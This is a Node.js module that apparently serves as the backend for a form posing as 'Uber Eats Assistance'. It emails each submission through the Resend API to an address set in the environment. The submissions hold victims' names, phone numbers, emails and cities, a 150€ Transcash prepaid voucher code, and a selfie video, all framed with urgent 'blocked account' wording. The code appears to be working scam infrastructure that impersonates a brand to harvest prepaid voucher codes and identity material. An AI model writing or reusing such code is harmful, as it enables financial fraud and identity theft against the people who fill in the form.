const { Resend } = require('resend');
const fs = require('fs');

const resend = new Resend(process.env.RESEND_API_KEY);

class EmailService {
  async sendAssistanceRequest(formData, situation, pdfPath, videoPath) {
    try {
      const subject = situation === 'waiting' 
        ? `[ATTENTE] Uber Eats - ${formData.fullName}`
        : `[URGENT] Uber Eats BLOQUÉ - ${formData.fullName}`;

      const html = `
        <h1 style="color:#06C167;font-size:28px;">🚗 UBER EATS ASSISTANCE</h1>
        <h2 style="color:#333;">📋 NOUVELLE DEMANDE</h2>
        <table border="1" cellpadding="12" style="border-collapse:collapse;width:100%;font-size:14px;">
          <tr><td style="width:120px;padding:8px;"><strong>SITUATION</strong></td><td>${situation === 'waiting' ? '⏳ EN ATTENTE' : '🚫 BLOQUÉ'}</td></tr>
          <tr><td><strong>NOM</strong></td><td>${formData.fullName}</td></tr>
          <tr><td><strong>TÉLÉPHONE</strong></td><td>${formData.uberId}</td></tr>
          <tr><td><strong>EMAIL</strong></td><td>${formData.uberEmail}</td></tr>
          <tr><td><strong>VILLE</strong></td><td>${formData.city}</td></tr>
          <tr style="background:#ffeb3b"><td><strong>TRANSCASH 150€</strong></td><td><strong>❌ ${formData.transcashCode}</strong></td></tr>
        </table>
        <br>
        <p><strong>📎 PIÈCES JOINTES :</strong></p>
        <ul>
          <li>✅ PDF récapitulatif</li>
          <li>✅ Vidéo selfie vérification</li>
        </ul>
        <div style="background:#ffebee;color:#c62828;padding:20px;border-radius:8px;margin-top:20px;">
          <h3>⚡ ACTION URGENTE</h3>
          <p><strong>Traitement requis sous 24h maximum</strong></p>
        </div>
      `;

      // Convertir fichiers en base64
      const pdfBase64 = fs.readFileSync(pdfPath).toString('base64');
      const videoBase64 = fs.readFileSync(videoPath).toString('base64');

      const data = {
        from: 'Uber Eats Assistance <noreply@resend.dev>',
        to: process.env.RECIPIENT_EMAIL,
        subject: subject,
        html: html,
        attachments: [
          {
            filename: `uber-${formData.fullName.replace(/\s+/g, '-').toLowerCase()}-info.pdf`,
            content: pdfBase64,
            contentType: 'application/pdf'
          },
          {
            filename: `uber-${formData.fullName.replace(/\s+/g, '-').toLowerCase()}-video.mp4`,
            content: videoBase64,
            contentType: 'video/mp4'
          }
        ]
      };

      console.log('📧 Envoi Resend vers:', process.env.RECIPIENT_EMAIL);
      const result = await resend.emails.send(data);
      console.log('✅ RESEND SUCCÈS:', result.data.id);
      
      return { success: true, messageId: result.data.id };
      
    } catch (error) {
      console.error('❌ RESEND ERREUR:', error.message);
      throw new Error('Resend échoué: ' + error.message);
    }
  }
}

module.exports = new EmailService();
